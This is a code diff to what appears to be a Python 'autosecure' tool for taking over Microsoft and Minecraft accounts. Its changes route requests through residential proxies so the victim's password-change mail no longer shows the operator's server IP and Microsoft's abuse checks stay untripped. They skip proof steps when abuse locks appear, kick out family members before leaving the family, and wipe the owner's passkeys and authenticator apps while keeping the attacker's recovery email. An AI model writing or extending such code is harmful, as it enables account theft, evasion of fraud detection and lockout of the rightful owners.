@@ -8,6 +8,7 @@ from securing.utils.security.remove_devices import remove_devices
 from securing.utils.security.delete_aliases import delete_aliases
 from securing.utils.security.remove_proof import remove_proof
 from securing.utils.security.remove_fed_cred import remove_fed_cred
+from securing.utils.security.leave_family import leave_family
 from securing.utils.security.remove_zyger import remove_zyger
 from securing.utils.security.remove_2fa import remove_2fa
 from securing.utils.security.recovery import recover
@@ -102,8 +103,17 @@ def _copy_cookies(src: httpx.AsyncClient) -> httpx.Cookies:
     return jar
 
 
-async def _direct_xbl_client(session: httpx.AsyncClient) -> httpx.AsyncClient:
-    """Non-proxied client for Xbox/Minecraft SSO — proxy often kills sisu.xboxlive.com."""
+async def _minecraft_sso_client(session: httpx.AsyncClient) -> httpx.AsyncClient:
+    """Xbox/Minecraft SSO client.
+
+    login.live.com / account.live.com stay on the same sticky residential proxy
+    as login. Sending ``__Host-MSAAUTH`` from the VPS is what stamped
+    208.84.101.140 on password-change mail and tripped account.live.com/Abuse.
+    sisu.xboxlive.com often dies through residential HTTP CONNECT, so Xbox
+    hosts go direct.
+    """
+    from securing.utils.proxy import LiveXboxSplitTransport, microsoft_proxy_url
+
     headers = {
         "User-Agent": session.headers.get(
             "User-Agent",
@@ -112,14 +122,23 @@ async def _direct_xbl_client(session: httpx.AsyncClient) -> httpx.AsyncClient:
         ),
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
     }
+    kwargs = {
+        "cookies": _copy_cookies(session),
+        "headers": headers,
+        "timeout": httpx.Timeout(45.0, connect=20.0),
+        "follow_redirects": False,
+        "http2": False,
+        "trust_env": False,
+    }
+    proxy_url = microsoft_proxy_url(session)
+    if not proxy_url:
+        print("[!] - No proxy configured — XBL client is fully direct")
+        return httpx.AsyncClient(proxy=None, **kwargs)
+
+    print("[~] - XBL SSO: Live/account.live.com via sticky proxy, Xbox CDN direct")
     return httpx.AsyncClient(
-        cookies=_copy_cookies(session),
-        headers=headers,
-        timeout=httpx.Timeout(45.0, connect=20.0),
-        follow_redirects=False,
-        # Explicit: never inherit the secure session's proxy
-        proxy=None,
-        http2=False,
+        transport=LiveXboxSplitTransport(proxy_url),
+        **kwargs,
     )
 
 
@@ -127,11 +146,11 @@ async def _check_minecraft(session: httpx.AsyncClient, account_info: dict) -> st
     """Populate account_info['minecraft']. Returns outcome:
     'ok' | 'no_java' | 'no_mc' | 'transient'
     """
-    print("[~] - Checking Minecraft Account (XBL via direct connection)")
+    print("[~] - Checking Minecraft Account")
     sec_email = (account_info.get("microsoft") or {}).get("security_email")
     if sec_email in (None, "", "Couldn't Change!", "Unknown", "N/A"):
         sec_email = None
-    xbl_client = await _direct_xbl_client(session)
+    xbl_client = await _minecraft_sso_client(session)
     try:
         XBLResponse = await get_xbl(xbl_client, security_email=sec_email)
     finally:
@@ -244,7 +263,13 @@ def _is_autosecure_sunny_primary(email: str | None) -> bool:
     return local.startswith("sunny")
 
 
-async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, account_info: dict):
+async def secure(
+    session: httpx.AsyncClient,
+    command: bool,
+    recovery: bool,
+    account_info: dict,
+    embed_verify: bool = False,
+):
     # Main file where all processes to securing the account occur
 
     # To auto update if you edit the config via command
@@ -263,7 +288,7 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
         detail = format_exception_reason(exc)
         log.exception("get_amc failed: %s", detail)
         print(f"[X] - get_amc failed: {detail}")
-        raise RuntimeError(f"get_amc failed: {detail}") from exc
+        raise
 
     apicanary = await get_cookies(session)
     if not apicanary:
@@ -312,6 +337,23 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
                 account_info["minecraft"].get("gamertag"),
             )
 
+    if embed_verify:
+        from securing.account_filters import is_embed_verify_no_minecraft
+
+        if is_embed_verify_no_minecraft(account_info):
+            print(
+                "[!] - Embed verify: no Minecraft Java — "
+                "stopping before credential change"
+            )
+            log.info(
+                "embed verify no Minecraft Java for %s (name=%s method=%s)",
+                account_info.get("microsoft", {}).get("email"),
+                account_info.get("minecraft", {}).get("name"),
+                account_info.get("minecraft", {}).get("method"),
+            )
+            account_info["embed_no_minecraft"] = True
+            return account_info
+
     # Refresh canary after MC / SSO elevation (password/reset may work now)
     if not apicanary:
         apicanary = await get_cookies(session)
@@ -347,6 +389,26 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
     if not isinstance(subscriptions, dict):
         subscriptions = {}
 
+    # Organizer-in-family is not the child Family-Locked login interrupt.
+    # Kick other members first (last-admin), then leave so autobuy doesn't reject.
+    try:
+        left = await leave_family(
+            session,
+            home_token=verification_tokens.get("home"),
+        )
+        if isinstance(left, dict):
+            account_info["microsoft"]["family_leave"] = {
+                "kicked": int(left.get("kicked") or 0),
+                "left": bool(left.get("left")),
+                "error": left.get("error"),
+            }
+            remaining = left.get("remaining")
+            if left.get("attempted") and isinstance(remaining, list):
+                family = {**family, "members": remaining}
+    except Exception as exc:
+        log.warning("leave_family soft-fail: %s", exc)
+        print(f"[!] - leave_family skipped ({exc.__class__.__name__})")
+
     print("[+] - Got DOB (Subscriptions, Family, Devices, Card...)")
     account_info["microsoft"]["firstName"] = owner_info.get("firstName") or "Failed to Get"
     account_info["microsoft"]["lastName"] = owner_info.get("lastName") or "Failed to Get"
@@ -358,7 +420,7 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
         (contacts.get("msaPhones") or []) + (contacts.get("mmxPhones") or [])
     )
 
-    account_info["microsoft"]["family"] = family.get("members") or []
+    account_info["microsoft"]["family"] = family.get("members") or family.get("Members") or []
     account_info["microsoft"]["devices"] = devices.get("devices") or []
     account_info["microsoft"]["cards"] = cards.get("paymentInstruments") or []
     account_info["microsoft"]["subscriptions"] = {
@@ -407,21 +469,27 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
         # succeeded — or on re-secure when GetOneTimeCode returns 203/204.
         # Soft-continue when we have a recovery code so RecoverUser can still run.
         msg = str(exc)
+        abuse_blocked = (
+            "Abuse" in msg
+            or "unusual-activity" in msg.lower()
+            or "unusual activity" in msg.lower()
+        )
         i5600_blocked = (
             "could not find var t0" in msg
             or "Help-us-protect" in msg
             or "i5600" in msg
             or "proofs page" in msg
         )
-        if has_recovery and i5600_blocked:
+        if abuse_blocked or (has_recovery and i5600_blocked):
             log.warning(
                 "security_information soft-skip after recover for %s: %s",
                 ms.get("email"),
                 msg[:300],
             )
             print(
-                "[!] - Proofs MFA blocked (i5600) — continuing with existing recovery "
-                "(skipping proofs/Manage t0)"
+                "[!] - Proofs page blocked "
+                f"({'Abuse lock' if abuse_blocked else 'i5600 MFA'}) — "
+                "continuing without proofs/Manage t0"
             )
             security_parameters = None
         else:
@@ -494,8 +562,9 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
             except Exception as exc:
                 log.warning("remove_fed_cred soft-fail: %s", exc)
                 print(f"[!] - remove_fed_cred skipped ({exc.__class__.__name__})")
-            # Wipe foreign proofs / passkeys (iCloud Keychain, Samsung Pass via
-            # RemovePasskey) / auth apps — keep OUR recovery security email.
+            # Wipe foreign proofs / passkeys (iCloud Keychain, Samsung Pass,
+            # Google Password Manager via RemovePasskey) / auth apps —
+            # keep OUR recovery security email.
             keep_sec = (account_info.get("microsoft") or {}).get("security_email")
             wipe = await remove_proof(
                 session,
